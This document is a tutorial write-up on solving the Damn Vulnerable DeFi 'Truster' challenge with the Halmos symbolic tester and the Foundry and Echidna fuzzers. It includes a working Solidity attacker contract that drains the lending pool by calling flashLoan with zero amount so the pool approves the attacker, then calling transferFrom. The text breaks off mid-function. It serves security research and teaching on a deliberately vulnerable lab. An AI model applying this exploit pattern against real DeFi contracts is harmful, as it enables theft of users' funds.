# Halmos vs Truster
## Halmos version
halmos 0.2.1.dev16+g1502e46 was used in this article
## Foreword
It is strongly assumed that the reader is familiar with the previous article on solving ["Unstoppable"](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/unstoppable), since the main ideas here are largely repeated and we will not dwell on them again. It should also be clearly stated that we have postponed the ["Naive-receiver"](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/naive-receiver) solution for now, because it is in "Truster" that further necessary techniques for the "Naive-receiver" solution are described. In order not to mislead the reader and not to rush ahead, this order of presentation of the material was chosen.
## Idea overview
Based on what we already know, we will again try to make an attacker contract that would symbolically execute some transaction and hope that this will lead to the attack we need. But will it be enough this time?
## Preparation for the attack
### Common prerequisites 
1. Copy Truster.t.sol file to TrusterHalmos.t.sol. All Halmos-related changes should be done here.
2. Rename **"test_truster()"** to **"check_truster()"**, so Halmos will execute this test symbolically.
3. Avoid using **makeAddr()** cheatcode:
    ```solidity
    address deployer = address(0xcafe0000);
    address player = address(0xcafe0001);
    address recovery = address(0xcafe0002);
    ```
4. vm.getNonce() is unsupportable cheat-code. However, we can be sure that the player will perform only one transaction, since all the work will be done under SymbolicAttacker anyway. Let's remove this check.
### Deploying SymbolicAttacker contract
We still have the same attack technique through the SymbolicAttacker contract. However, this time we have nothing to transfer to it - the player has no additional resources, so the deployment will look a little easier. Also, don't forget to print all the addresses of contracts - this is very useful information. 
```solidity
function check_truster() public checkSolvedByPlayer {
    SymbolicAttacker attacker = new SymbolicAttacker();
    attacker.attack();
}
```
### SymbolicAttacker implementation
Let's try to use the same code and perform some symbolic transaction:
```solidity
// SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

import "halmos-cheatcodes/SymTest.sol";
import "forge-std/Test.sol";

contract SymbolicAttacker is Test, SymTest {
	function attack() public {
        address target = svm.createAddress("target");
        vm.assume (target != address(this)); // Avoid recursion
        bytes memory data = svm.createBytes(100, 'data');
        target.call(data);
    }
}
```
### _isSolved() implementation
The original checks look like:
```solidity
function  _isSolved() private {
...
assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
}
```
Then the opposite check will look like this:
```solidity
function  _isSolved() private {
    ...
    assert(token.balanceOf(address(pool)) != 0 || token.balanceOf(recovery) != TOKENS_IN_POOL);
}
```
### Starting Halmos
```javascript
$ halmos --solver-timeout-assertion 0 --function check_truster
...
Running 1 tests for test/truster/TrusterHalmos.t.sol:TrusterChallenge
[console.log] token      0x00000000000000000000000000000000000000000000000000000000aaaa0002
[console.log] pool       0x00000000000000000000000000000000000000000000000000000000aaaa0003
[console.log] attacker   0x00000000000000000000000000000000000000000000000000000000aaaa0004
[PASS] check_truster() (paths: 28, time: 0.74s, bounds: [])
Symbolic test result: 1 passed; 0 failed; time: 0.82s      
```
And... nothing :(. Passing the test means that it didn't find the way to break this invariant. Let's figure out what's wrong.
## Debugging and solutions
Execute this test in verbose mode:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_truster  -vvvvv
...
Path #28:
    - Not(halmos_target_address_eb8bd05_01 == 0xaaaa0004)
    - halmos_target_address_eb8bd05_01 == 0xaaaa0003
    - Extract(0x31f, 0x300, halmos_data_bytes_80d9faf_02) == 0xab19e0c0
...
Trace:
    CALL TrusterChallenge::0xec4154cf()
        CALL hevm::startPrank(0x00000000000000000000000000000000000000000000000000000000cafe000100000000000000000000000000000000000000000000000000000000cafe0001)
        ...
            STATICCALL svm::createBytes(0x0000000000000000000000000000000000000000000000000000000000000064000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000046461746100000000000000000000000000000000000000000000000000000000)
            ↩ Concat(0x00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000064, halmos_data_bytes_80d9faf_02())
            CALL 0xaaaa0003::Extract(halmos_data_bytes_80d9faf_02())(Extract(halmos_data_bytes_80d9faf_02())) // !!!THIS IS A PROBLEM!!!
            ↩ REVERT 0x (error: Revert())
...
```
Let's analyze this reverted path, since this is an unpredictable revert from non-view function.
In general, we are interested in these lines:
```javascript
- Extract(0x31f, 0x300, halmos_data_bytes_80d9faf_02) == 0xab19e0c0
...
CALL 0xaaaa0003::Extract(halmos_data_bytes_80d9faf_02())(Extract(halmos_data_bytes_80d9faf_02()))
↩ REVERT 0x (error: Revert())
```
**0xaaaa0003** is the pool address. **0xab19e0c0** is the **flashLoan** function selector:
```javascript
$ cast 4b 0xab19e0c0
flashLoan(uint256,address,address,bytes)
```
In this case, Halmos tries to resolve the parameters of some external function, but this leads to an immediate revert. Often, this means that we simply do not have enough length for our symbolic calldata. So, do we just need to create a larger calldata?
```solidity
contract SymbolicAttacker is Test, SymTest {
	function attack() public {
	...
	    bytes memory data = svm.createBytes(10000, 'data'); // 100 -> 10000
	...
	}
```
And execute:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_truster
...
[ERROR] check_truster() (paths: 38, time: 3.80s, bounds: [])
WARNING:halmos:Encountered symbolic CALLDATALOAD offset: 4 + Extract(79199, 78944, halmos_data_bytes_8bdc959_02)
Symbolic test result: 0 passed; 1 failed; time: 3.90s
```
Hmm, something new. What this warning actually means is that we're passing some calldata bytes to the function as a parameter, but we're doing it via a symbolic call. In simple words, Halmos does not understand where to put "calldata from parameter" in our symbolic calldata and throws an error. 
Let's not delay, it is obvious that this function is our "flashLoan". Its 4th parameter is **"bytes calldata data"**:
```solidity
contract TrusterLenderPool is ReentrancyGuard {
...
function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
```
Fortunately, Halmos provides a special cheat-code for such cases: svm.createCalldata(). All we need to generate valid calldata is the contract type passed as a parameter to this cheat-code. One of the most obvious ways to use it in our attacker is this piece of code:
```solidity
contract SymbolicAttacker is Test, SymTest {
    function attack() public {
        address target = svm.createAddress("target");
        bytes memory data;
        vm.assume (target != address(this)); // Avoid recursion
        if (target == address(0xaaaa0002)) { // token
            data = svm.createCalldata("DamnValuableToken");
        }
        if (target == address(0xaaaa0003)) { // pool
            data = svm.createCalldata("TrusterLenderPool");
        }
        else {
            revert();
        }
        target.call(data);
    }
}
```
Run:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_truster
...
[ERROR] check_truster() (paths: 193, time: 10.48s, bounds: []) 
WARNING:halmos:Encountered symbolic CALLDATALOAD offset: 4 + Extract(7391, 7136, p_data_bytes_9090625_07)
```
What? Same error again? Actually no. Firstly, the number of paths has increased: 193 against 38, and secondly, this one now appears in another function:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_truster -vvvvv
Path #108:
...
Trace:
            CALL 0xaaaa0003::flashLoan(...)
            ...
                CALL 0xaaaa0003::Extract(p_data_bytes_334a71c_07())(Extract(p_data_bytes_334a71c_07()))
                ↩ CALLDATALOAD 0x (error: NotConcreteError('symbolic CALLDATALOAD offset: 4 + Extract(7391, 7136, p_data_bytes_334a71c_07)'))
...
```
The error is some symbolic call in **TrusterLenderPool::flashLoan()** function:
```solidity
function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
...
{
...
    target.functionCall(data);
}
```
Yes, since the **data** parameter also turned out to be symbolic, we got into the same pattern again and got the same error. However, this time, knowing that we can get to a symbolic call of a symbolic address in any contract, we will use a more universal solution!
## Global storage
Let's create a library global storage contract that can be accessed from anywhere:
```solidity
// SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

import "./halmos-cheatcodes/src/SymTest.sol";
import {Test, console} from "forge-std/Test.sol";

contract GlobalStorage is SymTest {
    // uint256->address mapping to have an ability to iterate over addresses
    mapping (uint256 => address) addresses;
    mapping (address => string) names_by_addr;

    uint256 addresses_list_size = 0;

    // Addresses and names information is stored using this setter
    function add_addr_name_pair (address addr, string memory name) public {
        addresses[addresses_list_size] = addr;
        addresses_list_size++;
        names_by_addr[addr] = name;
    }

    /*
    ** if addr is a concrete value, this returns (addr, symbolic calldata for addr)
    ** if addr is symbolic, execution will split for each feasible case and it will return 
    **      (addr0, symbolic calldata for addr0), (addr1, symbolic calldata for addr1), 
            ..., and so on (one pair per path)
    ** if addr is symbolic but has only 1 feasible value (e.g. with vm.assume(addr == ...)), 
            then it should behave like the concrete case
    */
    function get_concrete_from_symbolic (address /*symbolic*/ addr) public view 
                                        returns (address ret, bytes memory data) 
    {
        for (uint256 i = 0; i < addresses_list_size; i++) {
            if (addresses[i] == addr) {
                string memory name = names_by_addr[addr];
                return (addresses[i], svm.createCalldata(name));
            }
        }
        revert(); // Ignore cases when addr is not some concrete known address
    }
}
```

We will not dwell on the implementation details of this contract. I will only say that this is a contract in which you can store address->contract name pairs. And also with its help you can conveniently brute force addresses symbolically. It is easier to show how to use it in practice. First, let's prepare Global Storage in TrusterHalmos.t.sol:
```solidity
...
import "lib/GlobalStorage.sol";
...
contract TrusterChallenge is Test {
...
    GlobalStorage public glob; // Add global storage contract
    DamnValuableToken public token;
...
    function setUp() public {
    ...
        // Deploy global storage. It'll have a "0xaaaa0002" address
        glob = new GlobalStorage();
    ...
        glob.add_addr_name_pair(address(token), "DamnValuableToken");
        glob.add_addr_name_pair(address(pool), "TrusterLenderPool");
        vm.stopPrank();
    }
...
```
We will use it in SymbolicAttacker:
```solidity
...
import "lib/GlobalStorage.sol";
...
contract SymbolicAttacker is Test, SymTest {
    // We can hardcode this address for convenience
    GlobalStorage glob = GlobalStorage(address(0xaaaa0002)); 

    function attack() public {
        address target = svm.createAddress("target");
        bytes memory data;
        //Get some concrete target-name pair
        (target, data) = glob.get_concrete_from_symbolic(target);
        target.call(data);
    }
}
```
And in TrusterLenderPool:
```solidity
...
GlobalStorage glob = GlobalStorage(address(0xaaaa0002)); 
...
// Symbolic flashloan function
function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
    external
    nonReentrant
    returns (bool)
{
    uint256 balanceBefore = token.balanceOf(address(this));

    token.transfer(borrower, amount);

    // Work with "newdata" like this is the "data"
    bytes memory newdata;
    (target, newdata) = glob.get_concrete_from_symbolic(target);
    target.functionCall(newdata);

    if (token.balanceOf(address(this)) < balanceBefore) {
        revert RepayFailed();
    }

    return true;
}
```
And run Halmos:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_truster
...
[console.log] glob       0x00000000000000000000000000000000000000000000000000000000aaaa0002
[console.log] token      0x00000000000000000000000000000000000000000000000000000000aaaa0003
[console.log] pool       0x00000000000000000000000000000000000000000000000000000000aaaa0004
[console.log] attacker   0x00000000000000000000000000000000000000000000000000000000aaaa0005
[PASS] check_truster() (paths: 132, time: 8.24s, bounds: [])
```
Halmos still can't find a counterexample. But at least now there are no such errors and all functions are covered. Let's go to the next step!
## Another transaction
Finally, we got to the most interesting part. If the problem is not solved in one transaction, we will add another one:
```solidity
contract SymbolicAttacker is Test, SymTest {
    // We can hardcode this address for convenience
    GlobalStorage glob = GlobalStorage(address(0xaaaa0002)); 

    function execute_tx() private {
        address target = svm.createAddress("target");
        bytes memory data;
        //Get some concrete target-name pair
        (target, data) = glob.get_concrete_from_symbolic(target);
        target.call(data);
    }

	function attack() public {
        execute_tx();
        execute_tx();
    }
}
```
Run:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_truster
...
Running 1 tests for test/truster/TrusterHalmos.t.sol:TrusterChallenge
[console.log] glob       0x00000000000000000000000000000000000000000000000000000000aaaa0002
[console.log] token      0x00000000000000000000000000000000000000000000000000000000aaaa0003
[console.log] pool       0x00000000000000000000000000000000000000000000000000000000aaaa0004
[console.log] attacker   0x00000000000000000000000000000000000000000000000000000000aaaa0005
...
Counterexample:
halmos_target_address_a04f1b3_01 = 0x00000000000000000000000000000000aaaa0003
halmos_target_address_bebb031_18 = 0x00000000000000000000000000000000aaaa0003
p_amount_uint256_9a4d93a_34 = 0x00000000000000000000000000000000000000000000d3c21bcecceda1000000
p_deadline_uint256_ddaa6c9_09 = 0x0000000020000000000000000000000000000000000000000000000000000000
p_from_address_4e6d758_32 = 0x00000000000000000000000000000000000000000000000000000000aaaa0004
p_owner_address_250ba74_06 = 0x00000000000000000000000000000000000000000000000000000000aaaa0004
p_r_bytes32_5b6a04f_11 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_s_bytes32_2ebd850_12 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_spender_address_ca49768_07 = 0x00000000000000000000000000000000000000000000000000000000aaaa0005
p_to_address_d90fbcd_33 = 0x00000000000000000000000000000000000000000000000000000000cafe0002
p_v_uint8_57499b7_10 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_value_uint256_29e8407_08 = 0x0000000000000000000000000000002000000000000002820a0200411081fe82
...
Counterexample:
halmos_target_address_a04f1b3_01 = 0x00000000000000000000000000000000aaaa0004
halmos_target_address_acee6c4_25 = 0x00000000000000000000000000000000aaaa0003
p_amount_uint256_47345cb_41 = 0x00000000000000000000000000000000000000000000d3c21bcecceda1000000
p_amount_uint256_eaa2e50_04 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_borrower_address_2411608_05 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_data_length_69a6119_08 = 0x0000000000000000000000000000000000000000000000000000000000000400
p_deadline_uint256_f555a4e_16 = 0x8000000000000000000000000000000000000000000000000000000000000000
p_from_address_2e55d34_39 = 0x00000000000000000000000000000000000000000000000000000000aaaa0004
p_owner_address_ede4577_13 = 0x00000000000000000000000000000000000000000000000000000000aaaa0004
p_r_bytes32_a9f3cf2_18 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_s_bytes32_2c3a56d_19 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_spender_address_5bf20a3_14 = 0x00000000000000000000000000000000000000000000000000000000aaaa0005
p_target_address_2ee1188_06 = 0x00000000000000000000000000000000000000000000000000000000aaaa0003
p_to_address_4b8b987_40 = 0x00000000000000000000000000000000000000000000000000000000cafe0002
p_v_uint8_3118a03_17 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_value_uint256_7f72094_15 = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
...
Counterexample:
halmos_target_address_1dec87e_25 = 0x00000000000000000000000000000000aaaa0003
halmos_target_address_a04f1b3_01 = 0x00000000000000000000000000000000aaaa0004
p_amount_uint256_afdfdc5_12 = 0x0000000000000000000000000000000000080000000000000000000000000000
p_amount_uint256_bda6e88_41 = 0x00000000000000000000000000000000000000000000d3c21bcecceda1000000
p_amount_uint256_eaa2e50_04 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_borrower_address_2411608_05 = 0x00000000000000000000000000000000000000000000000000000000cafe0000
p_data_length_69a6119_08 = 0x0000000000000000000000000000000000000000000000000000000000000400
p_from_address_ff90fbc_39 = 0x00000000000000000000000000000000000000000000000000000000aaaa0004
p_spender_address_7a9b22c_11 = 0x00000000000000000000000000000000000000000000000000000000aaaa0005
p_target_address_2ee1188_06 = 0x00000000000000000000000000000000000000000000000000000000aaaa0003
p_to_address_c01d91b_40 = 0x00000000000000000000000000000000000000000000000000000000cafe0002
...
Symbolic test result: 0 passed; 1 failed; time: 1366.30s
```
Symbolic execution of even two attacking transactions is hard work, so it took as much as 23 minutes on my machine. But there is also good news - Halmos did find 3 unique counterexamples. However, it is not yet clear which functions were called. Therefore, we will use the following hint:
```solidity
contract GlobalStorage is Test, SymTest {
...
function get_concrete_from_symbolic (address /*symbolic*/ addr) public view 
                                        returns (address ret, bytes memory data) {
    for (uint256 i = 0; i < addresses_list_size; i++) {
        if (addresses[i] == addr) {
            string memory name = names_by_addr[addresses[i]];
            ret = addresses[i];
            data = svm.createCalldata(name);
            bytes4 selector = svm.createBytes4("selector");
            vm.assume(selector == bytes4(data)); // Now Halmos will show us selectors
            return (ret, data);
        }
    }
    revert(); // Ignore cases when addr is not some concrete known address
}
```
Now, Halmos shows us that selectors. Let's analyze each counterexample one by one:
```javascript
Counterexample:
halmos_selector_bytes4_1442fb7_18 = permit
halmos_selector_bytes4_3d82d4e_36 = transferFrom
halmos_target_address_8f80b6b_19 = 0x00000000000000000000000000000000aaaa0003
halmos_target_address_b0f3fc8_01 = 0x00000000000000000000000000000000aaaa0003
p_amount_uint256_3cb746f_35 = 0x00000000000000000000000000000000000000000000d3c21bcecceda1000000
p_deadline_uint256_ab117ab_09 = 0x8000000000000000000000000000000000000000000000000000000000000000
p_from_address_4dc2648_33 = 0x00000000000000000000000000000000000000000000000000000000aaaa0004
p_owner_address_6d86217_06 = 0x00000000000000000000000000000000000000000000000000000000aaaa0004
p_r_bytes32_96d075f_11 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_s_bytes32_2eef2b4_12 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_spender_address_d4f0916_07 = 0x00000000000000000000000000000000000000000000000000000000aaaa0005
p_to_address_8272409_34 = 0x00000000000000000000000000000000000000000000000000000000cafe0002
p_v_uint8_49e43a7_10 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_value_uint256_d5bb651_08 = 0x80000000000000000000000000000000000000000000005000200e0000000000
```
Wow, Halmos thinks an attacker can call the [permit](https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#IERC20Permit-permit-address-address-uint256-uint256-uint8-bytes32-bytes32-) function from **ERC20** with pool's signature, thereby allowing to call **transferFrom**, sending all funds to the recovery account.  The problem is that the attacker does not have a private key from the pool, so he cannot craft such a function call. Obviously, we cannot use symbolic analysis to crack the cryptography of signatures. And the null bytes provided by Halmos for the v, r and s parameters confirm this. Therefore, this is, unfortunately, a fake solution.
The situation is similar with the second counterexample:
```javascript
Counterexample:
halmos_selector_bytes4_6aa2890_44 = transferFrom
halmos_selector_bytes4_886db9c_26 = permit
halmos_selector_bytes4_eaf3f0c_09 = flashLoan
halmos_target_address_28b9879_27 = 0x00000000000000000000000000000000aaaa0003
halmos_target_address_b0f3fc8_01 = 0x00000000000000000000000000000000aaaa0004
p_amount_uint256_540579e_04 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_amount_uint256_68bd5b7_43 = 0x00000000000000000000000000000000000000000000d3c21bcecceda1000000
p_borrower_address_726f579_05 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_data_length_1e22349_08 = 0x0000000000000000000000000000000000000000000000000000000000000400
p_deadline_uint256_cddf022_17 = 0x1000000000000000000000000000000000000000000000000000000000000000
p_from_address_228a06d_41 = 0x00000000000000000000000000000000000000000000000000000000aaaa0004
p_owner_address_3062812_14 = 0x00000000000000000000000000000000000000000000000000000000aaaa0004
p_r_bytes32_cfaf057_19 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_s_bytes32_c6f3435_20 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_spender_address_cf5d230_15 = 0x00000000000000000000000000000000000000000000000000000000aaaa0005
p_target_address_de4b479_06 = 0x00000000000000000000000000000000000000000000000000000000aaaa0003
p_to_address_9bc8f39_42 = 0x00000000000000000000000000000000000000000000000000000000cafe0002
p_v_uint8_88f0351_18 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_value_uint256_a28c1c2_16 = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff 
```
Here is the same **permit**, but this time we entered it from under **flashLoan**. Interestingly, we noticed here: if you pass the amount to **flashLoan** as 0, the transaction will still go through, and nothing needs to be returned.
And only for the third time, finally, Halmos did find a solution to this problem. Although it was spinning nearby :D 
```javascript
Counterexample:
halmos_selector_bytes4_1034b81_26 = approve
halmos_selector_bytes4_478bb2d_44 = transferFrom
halmos_selector_bytes4_eaf3f0c_09 = flashLoan
halmos_target_address_331efb7_27 = 0x00000000000000000000000000000000aaaa0003
halmos_target_address_b0f3fc8_01 = 0x00000000000000000000000000000000aaaa0004
p_amount_uint256_0811e0c_13 = 0x0020000000000000000000000000000000000000000000000000000000000000
p_amount_uint256_20a8ea2_43 = 0x00000000000000000000000000000000000000000000d3c21bcecceda1000000
p_amount_uint256_540579e_04 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_borrower_address_726f579_05 = 0x00000000000000000000000000000000000000000000000000000000aaaa0004
p_data_length_1e22349_08 = 0x0000000000000000000000000000000000000000000000000000000000000400
p_from_address_b772801_41 = 0x00000000000000000000000000000000000000000000000000000000aaaa0004
p_spender_address_429fd9d_12 = 0x00000000000000000000000000000000000000000000000000000000aaaa0005
p_target_address_de4b479_06 = 0x00000000000000000000000000000000000000000000000000000000aaaa0003
p_to_address_50e8baf_42 = 0x00000000000000000000000000000000000000000000000000000000cafe0002 
```
Of course, we call **flashLoan** with the parameter **amount=0**, force the pool inside flashLoan to call **approve** all tokens for attacker. And then we just make **transferFrom** pool to recovery the second transaction.
## Using a counterexample
We need these addresses in forge:
```javascript
$ forge test -vvv --mp test/truster/Truster.t.sol
...
Logs:
    token          0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b
    pool           0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264
    recovery       0x73030B99950fB19C6A813465E58A0BcA5487FBEa
...
```
Attacker:
```solidity
pragma solidity =0.8.25;

import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";

contract Attacker {
    function attack() public {
        DamnValuableToken token = DamnValuableToken(address(0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b));
        TrusterLenderPool pool = TrusterLenderPool(address(0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264));
        address recovery = address(0x73030B99950fB19C6A813465E58A0BcA5487FBEa);
        pool.flashLoan(0, address(this), address(token), 
                            abi.encodeWithSignature("approve(address,uint256)", 
                            address(this), 
                            0x0020000000000000000000000000000000000000000000000000000000000000));
        token.transferFrom(address(pool), recovery, 0x00000000000000000000000000000000000000000000d3c21bcecceda1000000);
    }
} 
```
Run:
```javascript
$ forge test -vvv --mp test/truster/Truster.t.sol
...
Logs:
    token          0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b
    pool           0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264
    recovery       0x73030B99950fB19C6A813465E58A0BcA5487FBEa
...
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 1.24ms (386.40µs CPU time)
...
```
Passed! Halmos successfully solved this problem as well.
## Fuzzing time!
### Foundry
Let's start with Foundry invariant testing. For "fairness" sake, we'll also give it plenty of time to run.
Foundry.toml:
```javascript
...
[fuzz]
runs = 100000
```
Truster_Fuzz.t.sol:
```solidity
function setUp() public {
...
    targetSender(player);
}
...
function invariant_isSolved() public {
    assert(token.balanceOf(address(pool)) >= TOKENS_IN_POOL);
}
```
As an invariant, the criterion "Can we manipulate the balance of the pool in a downward direction at all?" was selected. Try it:
```javascript
$ forge test -vvvvv --mp test/truster/Truster_Fuzz.t.sol
...
[PASS] invariant_isSolved() (runs: 100000, calls: 50000000, reverts: 39756330)
...
[24523] DamnValuableToken::approve(0x00000000000000000000000000000000000003A2, 3580)
...
[6974] DamnValuableToken::transfer(0x5BE45f33883Ce9E32a648b77F365b4A292C360cE, 0)
...
```
Nothing. Even no successful transaction using **"flashLoan"**. So, I decided to give the fuzzer a big tip:
```solidity
// Fuzz flashloan function

function _flashLoan(uint256 amount, address borrower)
    external
    nonReentrant
    returns (bool)
{
    uint256 balanceBefore = token.balanceOf(address(this));
    bytes memory data = abi.encodeWithSignature("approve(address,uint256)", 
                        address(0x44E97aF4418b7a17AABD8090bEA0A471a366305C ), 
                        0x0020000000000000000000000000000000000000000000000000000000000000);

    token.transfer(borrower, amount);
    address(0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b).functionCall(data);


    if (token.balanceOf(address(this)) < balanceBefore) {
        revert RepayFailed();
    }

    return true;
}
```
Yes, this is a ready transaction to approve tokens. Run:
```javascript
$ forge test -vvvvv --mp test/truster/Truster_Fuzz.t.sol
...
[FAIL: invariant_isSolved replay failure]
        [Sequence]
                sender=0x44E97aF4418b7a17AABD8090bEA0A471a366305C addr=[src/truster/TrusterLenderPool.sol:TrusterLenderPool]0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264 calldata=_flashLoan(uint256,address) args=[0, 0x85B3d986977391795F57ce5c08d0E1925c7ADc80]
                sender=0x44E97aF4418b7a17AABD8090bEA0A471a366305C addr=[src/DamnValuableToken.sol:DamnValuableToken]0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b calldata=transferFrom(address,address,uint256) args=[0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264, 0x000000000000000000000000000000000000022D, 67]
```
With this hint, the Foundry fuzzer did find the attack. As I understand it, the very construction of some transaction through target and data passed through parameters is already a problem for Foundry fuzzer.
Okay, so let's rewrite our hint, but make it less explicit and avoid passing target and data through parameters:
```solidity
// Fuzz flashloan function (less hint)
function __flashLoan(uint256 amount, address borrower, bool is_approve, address to, uint256 amount_to_approve)
    external
    nonReentrant
    returns (bool)
{
    uint256 balanceBefore = token.balanceOf(address(this));
    
    token.transfer(borrower, amount);
    if (is_approve) {
        token.approve(to, amount);
    }
    if (token.balanceOf(address(this)) < balanceBefore) {
        revert RepayFailed();
    }

    return true;
}
```
Here, it is enough to pass is **false = true**, **to** as the address of the player, and a rather large **amount_to_approve** to the fuzzer. And perform **transferFrom** with another transaction. Let's try:
```javascript
$ forge test -vvvvv --mp test/truster/Truster_Fuzz.t.sol
...
  [22609] TrusterLenderPool::__flashLoan(0, 0x511115Da795ee95A8f5557bE63E005478D4A19Bc, true, 0x50719d462702f96320f8747bc51b7b447c989Cb3, 5108201074406009179262425133938908488538452 [5.108e42])
  ...
      ├─ [4623] DamnValuableToken::approve(0x50719d462702f96320f8747bc51b7b447c989Cb3, 0)    
      │   ├─ emit Approval(owner: TrusterLenderPool: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], spender: 0x50719d462702f96320f8747bc51b7b447c989Cb3, amount: 0)
...
  [22609] TrusterLenderPool::__flashLoan(0, 0x33911140d693f2d422d721856297dfa98d3e9E48, true, 0x60CF39a6CcA10123Ee5Cb8d224CCde855be067CF, 1498798982649291 [1.498e15])
  ...
    ├─ [4623] DamnValuableToken::approve(0x60CF39a6CcA10123Ee5Cb8d224CCde855be067CF, 0)
    │   ├─ emit Approval(owner: TrusterLenderPool: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], spender: 0x60CF39a6CcA10123Ee5Cb8d224CCde855be067CF, amount: 0)
...
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1644.57s (1644.57s CPU time)
```
All transaction sequences with **"flashLoan->approve"** did not lead to anything, because some random addresses, which are not even deployed, were always chosen as the **"to"** parameter. We could still experiment with hints, but in my opinion such logic of the fuzzer is already too weak. Even if the solution exist, then we still have to twist the fuzzer logic a lot to achieve an acceptable result. 
So let's try something different.
### Echidna
I chose Echidna as another fuzzing engine. Echidna-styled invariant testing contract:
```solidity
// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";

contract TrusterEchidna {
    
    uint256 constant TOKENS_IN_POOL = 1_000_000e18;

    DamnValuableToken public token;
    TrusterLenderPool public pool;

    constructor() public payable {
        // Deploy token
        token = new DamnValuableToken();

        // Deploy pool and fund it
        pool = new TrusterLenderPool(token);
        token.transfer(address(pool), TOKENS_IN_POOL);
    
    }

    function echidna_testSolved() public returns (bool) {
        if (token.balanceOf(address(pool)) >= TOKENS_IN_POOL)
        {
            return true;
        }
        return false;
    }
}
```
config:
```javascript
deployer: '0xcafe0001'
sender: ['0xcafe0002']
allContracts: true
workers: 8
```
First, let's try again with a "clean" TrusterLenderPool:
```javascript
$ forge build
...
$ echidna test/truster/TrusterEchidna.sol --contract TrusterEchidna --config test/truster/truster.yaml --test-limit 10000000
...
echidna_testSolved: passing
Unique instructions: 2864
Corpus size: 15
Seed: 5278472965973577621
```
Unfortunately, nothing. Maybe with a hint, Echidna will find a solution? (Second "hinted" flashLoan function was used):
```javascript
$ forge build
...
$ echidna test/truster/TrusterEchidna.sol --contract TrusterEchidna --config test/truster/truster.yaml --test-limit 10000000
...
echidna_testSolved: failed!
  Call sequence:
    TrusterLenderPool.__flashLoan(1,0x62d69f6867a0a084c6d313943dc22023bc263691,true,0xcafe0002,1)
        DamnValuableToken.transferFrom(0x62d69f6867a0a084c6d313943dc22023bc263691,0x0,1)
...
```
Hooray! In this case, **Echidna** did find a sequence that breaks the invariant. However, we still gave a very large hint for the fuzzer. Therefore, let's consider all possible calls that could be made from under **flashLoan** (At least those that are in the setup). Ladies and gentlemen, meet FRANKENSTEIN:
```solidity
function __flashLoan(uint256 amount, address borrower,
                        bool is_token,
                        bool is_approve, address approve_to, uint256 approve_amount,
                        bool is_permit, address permit_owner, address permit_spender, 
                            uint256 permit_value, uint256 permit_deadline, uint8 permit_v,
                            bytes32 permit_r, bytes32 permit_s,
                        bool is_transfer, address transfer_to, uint256 transfer_amount,
                        bool is_transferFrom, address transferFrom_from, 
                            address transferFrom_to, uint256 transferFrom_amount
                        )
    external
    nonReentrant
    returns (bool)
{
    uint256 balanceBefore = token.balanceOf(address(this));
    
    token.transfer(borrower, amount);
    //target is token
    if (is_token) {
        if (is_approve) {
            token.approve(approve_to, approve_amount);
        }
        else if (is_permit) {
            token.permit(permit_owner, permit_spender, permit_value, 
                                        permit_deadline, permit_v,
                                        permit_r, permit_s);
        }
        else if (is_transfer) {
            token.transfer(transfer_to, transfer_amount);
        }
        else if (is_transferFrom) {
            token.transferFrom(transferFrom_from, transferFrom_to, transferFrom_amount);
        }
    }
    //target is pool
    else {
        bytes memory data = ""; // The only one function in pool is nonReentrant anyway
        address(this).functionCall(data); // Call flashloan itself
    }
    if (token.balanceOf(address(this)) < balanceBefore) {
